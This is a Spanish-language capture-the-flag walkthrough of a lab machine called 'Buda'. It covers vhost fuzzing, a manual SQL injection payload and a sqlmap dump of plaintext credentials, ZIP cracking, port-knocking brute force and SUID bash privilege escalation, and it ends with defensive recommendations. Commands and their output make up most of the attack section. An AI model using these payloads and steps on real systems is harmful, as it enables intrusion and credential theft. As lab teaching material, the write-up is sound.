Descripción

Buda es una máquina Linux de dificultad Hard de la plataforma The Hacker Labs. Combina tres técnicas avanzadas en cadena: enumeración de virtual hosts, explotación de SQL Injection para obtener credenciales de FTP, descubrimiento y crackeo de archivos protegidos, y finalmente port knocking para desbloquear SSH. Reconocimiento

Paso 1 — Nmap fase 1

Escaneo de puertos completo

¿Por qué?

El primer paso siempre es saber qué servicios expone la máquina. Usamos nmap con -p- para escanear los 65535 puertos TCP, ya que servicios no estándar o puertos altos pueden esconderse fácilmente.

nmap -p- --open -n -T4 -sS 192.168.253.145
-p- → escanea los 65535 puertos TCP
--open → muestra solo puertos abiertos
-sS → SYN scan (stealth, no completa el handshake)
-T4 → velocidad agresiva
Output nmap
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
Not shown: 65533 filtered tcp ports (no-response)
¿Qué nos dice?

Solo dos puertos abiertos: FTP (21) y HTTP (80). El puerto 22 (SSH) aparece filtrado, no cerrado — esto es la firma clásica de port knocking activo. El sistema tiene una "puerta secreta" que solo se abre con la secuencia correcta de paquetes.

Decisión

Escanear en profundidad FTP y HTTP, y buscar la secuencia de knock en esos servicios.

Paso 2 — Nmap profundo

Scripts y versiones

¿Por qué?

-sC ejecuta scripts de detección automática (como ftp-anon, http-title) y -sV identifica la versión exacta del servicio — información crítica para buscar exploits conocidos.

nmap -p21,80 -sC -sV -n 192.168.253.145
Output nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
¿Qué nos dice?

FTP corre vsftpd 3.0.5 — versión estable, sin CVEs críticos conocidos. HTTP es Apache 2.4.52 mostrando la página por defecto de Ubuntu, lo que significa que el contenido real está en otro virtual host (vhost).

Decisión

Explorar robots.txt en busca de pistas del vhost, y hacer fuzzing de virtual hosts con ffuf.

Paso 3 — Virtual Host Discovery

ffuf + robots.txt

¿Por qué?

Cuando Apache muestra su página por defecto, es señal de que el sitio real está configurado para responder a un nombre de host específico. ffuf fuerza bruta el header Host: para encontrar qué nombres de dominio tienen respuestas diferentes.

curl -s http://192.168.253.145/robots.txt 
User-agent: *
Allow: budasec.thl
ffuf -u http://192.168.253.145 -H "Host: FUZZ.budasec.thl" -w /usr/share/wordlists/dirb/common.txt -fs 10671
-fs 10671 → filtra respuestas del mismo tamaño que la página por defecto
FUZZ → posición donde se inyectan los subdominios del diccionario
dev                     [Status: 200, Size: 264, Words: 47, Lines: 12]
¿Qué nos dice?

robots.txt revela el dominio base budasec.thl. Existe el subdominio dev.budasec.thl con contenido diferente — un panel de login.

Decisión

Agregar dev.budasec.thl a /etc/hosts e investigar el panel de login.

Explotación Web — SQL Injection

Paso 4 — Detección de SQLi

SQL Injection manual en dev.php

¿Qué es SQL Injection?

Es una vulnerabilidad donde el input del usuario es insertado directamente en una consulta SQL sin sanitizar. Al introducir ' OR 1=1--, rompemos la lógica de la consulta y podemos extraer datos o bypasear autenticación.

curl -H "Host: dev.budasec.thl" --data "username=' OR 1=1-- -&password=x" http://192.168.253.145/dev.php 
Fatal error: Uncaught mysqli_sql_exception: You have an error in your
SQL syntax; check the manual that corresponds to your MySQL server
version for the right syntax to use near ''' at line 1 in
/var/www/html/xyprob/12356723/dev.php:28
¿Qué nos dice?

El error de MySQL es visible en la respuesta HTTP — la aplicación no maneja excepciones. Esto revela la ruta exacta del archivo PHP (/var/www/html/xyprob/12356723/dev.php) y que el campo username es inyectable.

Decisión

Usar sqlmap para automatizar el dump de la base de datos buda.

Paso 5 — sqlmap dump

Extracción de credenciales FTP

¿Qué es sqlmap?

sqlmap es la herramienta de referencia para automatizar la explotación de SQLi. Detecta automáticamente el tipo de inyección y extrae datos de la base de datos sin necesidad de hacerlo manualmente.

sqlmap -u "http://192.168.253.145/dev.php" -H "Host: dev.budasec.thl" --data "username=admin&password=test" --batch -D buda -T users -C username,password --dump --tamper=space2comment 
Database: buda
Table: users
+----------+--------------------+
| username | password           |
+----------+--------------------+
| admin    | admin123           |
| ftpuser  | ftpu@sr123p@@s!    |
| user1    | password1          |
| user2    | password2          |
+----------+--------------------+
¿Qué nos dice?

La tabla users expone credenciales en texto plano (sin hash). La más importante: ftpuser:ftpu@sr123p@@s! — este usuario es el acceso al servicio FTP.

Decisión

Conectar al FTP con ftpuser:ftpu@sr123p@@s! y explorar el contenido.

Paso 7 — fcrackzip

Crack del ZIP cifrado + lectura de knock

¿Qué es fcrackzip?

fcrackzip es un cracker especializado para archivos ZIP. -D activa diccionario, -u verifica descomprimiendo, -p especifica la wordlist.

cat knock 
9467
1739
8745
fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt documents.zip 
found file 'audit2024', (size cp/uc   1686/  4059, flags 9, chk 6bdb)

PASSWORD FOUND!!!!: pw == manuelito
¿Qué nos dice?

La contraseña del ZIP es manuelito. Contiene un archivo llamado audit2024 — un informe de auditoría con credenciales expuestas por error.

Paso 8 — Credenciales de yolanda

Extracción del archivo audit2024

unzip -P manuelito documents.zip
cat audit2024 | grep -i "yolanda\|credentials\|exposed" 
Exposed yolanda user credentials:y@lAnd361!
¿Qué nos dice?

El informe de auditoría contiene una línea que expone accidentalmente las credenciales del usuario yolanda: contraseña y@lAnd361!. Esto es un Data Exposure real — alguien metió credenciales de producción en un documento de auditoría.

Decisión

Usar KnockIt para abrir el puerto SSH y conectar como yolanda.

Port Knocking + SSH — User Flag

Paso 9 — KnockIt brute force

Descubrimiento de secuencia correcta

¿Qué es Port Knocking?

Port knocking es un mecanismo de seguridad donde el servidor tiene SSH bloqueado por firewall. Para abrirlo, hay que "tocar" una secuencia específica de puertos en el orden correcto. El daemon knockd escucha estos intentos y abre el firewall temporalmente. El archivo knock nos da los 3 puertos (9467, 1739, 8745) pero no el orden. KnockIt prueba las 6 permutaciones automáticamente.

python3 KnockIt/knockit.py -b 192.168.X.X 9467 1739 8745
-b → bruteforce (prueba todas las permutaciones 3! = 6)
[+] Knocking with sequence: (8745, 9467, 1739)
[+] Knocking on port TARGET:8745
[+] Knocking on port TARGET:9467
[+] Knocking on port TARGET:1739
******************************************************

$ nmap -p 22 TARGET
PORT   STATE SERVICE
22/tcp open  ssh     ← ¡ABIERTO!
¿Qué nos dice?

La secuencia correcta es 8745 → 9467 → 1739. Después de enviar los paquetes en este orden, knockd elimina la regla de iptables que bloqueaba el puerto 22.

Escalada de Privilegios — SUID Bash

Paso 11 — Enumeración SUID

Búsqueda de binarios con bit SUID

¿Por qué buscar SUID primero?

El bit SUID permite ejecutar un binario con los permisos del propietario. Si root es propietario de un binario con SUID, ese binario corre como root sin importar quién lo ejecute. Es uno de los vectores de privesc más directos.

find / -perm -u=s -type f 2>/dev/null 
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/bash    ← ANÓMALO!
/usr/bin/passwd
¿Qué nos dice?

/usr/bin/bash tiene el bit SUID activado. Esto es altamente inusual — bash con SUID jamás debería existir en producción. GTFOBins documenta cómo explotar esto: bash -p activa el modo privilegiado que preserva el UID efectivo del propietario (root).

Paso 12 — Root

bash -p → Shell de root

¿Qué hace bash -p?

El flag -p activa el modo "privilegiado" de bash. En modo normal, bash descarta el UID efectivo por seguridad. Con -p, mantiene el UID efectivo = root (gracias al SUID). El resultado es una shell root funcional.

bash -p 
bash-5.1# whoami
root

bash-5.1# cat /root/root.txt
88f33d5d82d4e1cd067b52f8fa1323c3  ✓
🏆 Root Flag

Recomendaciones de Seguridad

🔒
Usar Prepared Statements en todas las queries SQL
Reemplazar concatenación de strings por PDO con parámetros vinculados. El input del usuario nunca debe ser interpretado como código SQL.
🔑
Hashear contraseñas con bcrypt/Argon2
Nunca almacenar contraseñas en texto plano. Usar password_hash($pass, PASSWORD_BCRYPT) en PHP.
📄
No incluir credenciales en documentos de auditoría
Revisar todos los documentos antes de distribución. Implementar DLP. Los informes nunca deben contener credenciales reales.
🛡️
Auditar bits SUID/SGID regularmente
Ejecutar periódicamente: find / -perm -4000 -type f 2>/dev/null. /usr/bin/bash jamás debe tener SUID.
🗜️
Cifrado robusto para archivos sensibles
Las contraseñas de ZIP son crackeables. Usar GPG con clave pública o almacenar en secret managers.

Lecciones Aprendidas

🗡️ Atacante

  • Siempre revisar robots.txt — puede filtrar información del dominio
  • Los puertos filtrados no significan cerrados — port knocking es real
  • sqlmap con --tamper puede bypassear WAFs básicos
  • Los archivos de auditoría son una mina de oro de credenciales

🛡️ Defensor

  • Port knocking no es seguridad real — es oscuridad, no defensa
  • Prepared statements son obligatorios, no opcionales
  • SUID en bash es un error de configuración catastrófico
  • DLP y revisión de documentos antes de publicar

Glosario Técnico

Port Knocking
Técnica de seguridad que mantiene un puerto invisible/bloqueado hasta que se envían paquetes a una secuencia específica de puertos. knockd es el daemon más común en Linux.
SQL Injection (SQLi)
Vulnerabilidad donde input malicioso modifica la lógica de una consulta SQL. Puede causar bypass de autenticación, extracción de datos, escritura de archivos o ejecución de comandos.
Virtual Host (vhost)
Configuración de Apache/Nginx que sirve diferentes sitios desde el mismo servidor IP, diferenciándolos por el header HTTP Host:.
SUID (Set User ID)
Bit especial de permisos en Linux. Cuando está activo en un ejecutable, el programa corre con el UID del propietario del archivo, no del usuario que lo ejecuta.
sqlmap
Herramienta open-source que automatiza detección y explotación de SQL Injection. Soporta todos los tipos de inyección y puede dumpear bases de datos completas.
ffuf (Fuzz Faster U Fool)
Herramienta de fuzzing web escrita en Go. Extremadamente rápida para descubrir rutas, virtual hosts y endpoints ocultos mediante diccionarios.
fcrackzip
Herramienta para crackear contraseñas de archivos ZIP mediante diccionarios o fuerza bruta.
GTFOBins
Colección online que documenta cómo explotar binarios Unix legítimos para escalar privilegios, bypassear restricciones o exfiltrar datos.
